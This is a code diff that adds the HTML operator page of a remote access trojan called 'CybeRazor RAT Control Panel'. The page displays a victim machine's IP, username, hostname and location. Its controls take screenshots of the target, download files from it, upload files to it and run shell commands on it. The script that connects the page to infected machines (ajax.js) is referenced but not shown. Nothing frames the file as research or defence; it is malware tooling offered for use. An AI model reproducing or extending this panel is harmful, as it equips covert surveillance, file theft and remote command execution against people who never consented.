@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<title>CybeRazor RAT Control Panel</title>
+		<link href="../img/favicon.png" type="image/png" rel="icon">
+		<link href="../img/favicon.png" type="image/png" rel="apple-touch-icon">
+		<link href='https://fonts.googleapis.com/css?family=Lato:300,400,700,900' rel='stylesheet' type='text/css'>
+		<link href="assets/css/bootstrap.min.css" rel="stylesheet">
+		<link href="assets/css/bootstrap.techie.css" rel="stylesheet">
+		<style>
+			#screenshot { width: 20vw; height: 20vw; }
+			.loading{ width: 18px; height: 18px; }
+			.online { color: #02d92a; }
+			.offline { color: #d90202; }
+		</style>
+	</head>
+	<body>
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-12">
+					<center><h1><b>CybeRazor RAT Control Panel</b></h1></center>
+				</div>
+			</div>
+			<br>
+			<div class="row">
+				<div class="col-lg-6">
+					<center><h2>Status</h2></center>
+					<table class="table table-striped" data-effect="fade" id="status_table">
+						<tbody>
+							<tr>
+								<th>Connection:</th>
+								<td id="conn_status"><i class="fa fa-circle offline"></i> Offline</td>
+							</tr>
+							<tr>
+								<th>IP Address</th>
+								<td id="ip">N/D</td>
+							</tr>
+							<tr>
+								<th>Username</th>
+								<td id="username">N/D</td>
+							</tr>
+							<tr>
+								<th>Computer Name</th>
+								<td id="computername">N/D</td>
+							</tr>
+							<tr>
+								<th>Date and Time</th>
+								<td id="time">N/D</td>
+							</tr>
+							<tr>
+								<th>Location</th>
+								<td id="location">N/D</td>
+							</tr>
+						</tbody>
+					</table>
+					<br>
+					<center><a id="status_button" class="btn btn-primary" href="#"><i class="fa fa-refresh"></i> Refresh</a></center>
+				</div>
+				<div class="col-lg-6">
+					<center>
+						<h2>Screenshot</h2>
+						<a href="noimage.jpg" id="screenshot_link"><img src="img/noimage.jpg" id="screenshot_image" /></a>
+						<br>
+						<p id="screenshot_time">No screenshot available</p>
+						<div id="screenshot_loading" style="display:none;"><center><img class="loading" src="img/loading.gif" /> Loading...</center><br></div>
+						<a id="screenshot_button" class="btn btn-primary" href="#"><i class="fa fa-refresh"></i> Refresh</a>
+					</center>
+				</div>
+			</div>
+			<br>
+			<div class="row">
+				<div class="col-lg-4">
+					<center><h2>Get File</h2></center>
+					<div class="input-group">
+						<span class="input-group-addon"><i class="fa fa-file"></i></span>
+						<input type="text" class="form-control" placeholder="Path to file in target machine" id="getfile_filepath">
+					</div>
+					<br>
+					<center><a id="getfile_button" class="btn btn-primary" href="#"><i class="fa fa-download"></i> Get File</a></center>
+					<div id="getfile_loading" style="display:none;"><br><center><img class="loading" src="img/loading.gif" /> Loading...</center></div>
+				</div>
+				<div class="col-lg-4">
+					<center><h2>Shell Command</h2></center>
+					<div class="input-group">
+						<span class="input-group-addon"><i class="fa fa-terminal" style="font-weight:bolder;"></i></span>
+						<input type="text" class="form-control" placeholder="Command to execute" id="cmd_text">
+					</div>
+					<br>
+					<center><a id="cmd_button" class="btn btn-primary" href="#"><i class="fa fa-terminal" style="font-weight:bolder; font-size:21px;"></i> Execute command</a></center>
+					<br><br>
+					<center><b>Command response</b></center>
+					<div class="well" style="overflow:auto; max-height: 20vh;" id="cmd_output">
+						Here there will be displayed the command output as response.
+					</div>
+				</div>
+				<div class="col-lg-4">
+					<center><h2>Send File</h2></center>
+					<div class="input-group">
+						<span class="input-group-addon"><i class="fa fa-file"></i></span>
+						<input type="text" class="form-control" placeholder="Path to file in target machine" id="sendfile_filepath" style="width:20vw;">
+						<input type="file" class="btn btn-default" id="sendfile_filedata" style="width:20vw;">
+					</div>
+					<br>
+					<center><a id="sendfile_button" class="btn btn-primary" href="#"><i class="fa fa-upload"></i> Send File</a></center>
+					<div id="sendfile_loading" style="display:none;"><br><center><img class="loading" src="img/loading.gif" /> Loading...</center></div>
+				</div>
+			</div>
+			<br>
+			<span>
+				<b>Notes:</b>
+				<ul>
+					<li>If you want to use space in sendfile/getfile commands, write [SPACE] instead</li>
+					<li>Also, in sendfile/getfile commands use absolute path and double backslash pathname</li>
+				</ul>
+			</span>
+		</div>
+		<script src="ajax.js"></script>
+	</body>
+</html>
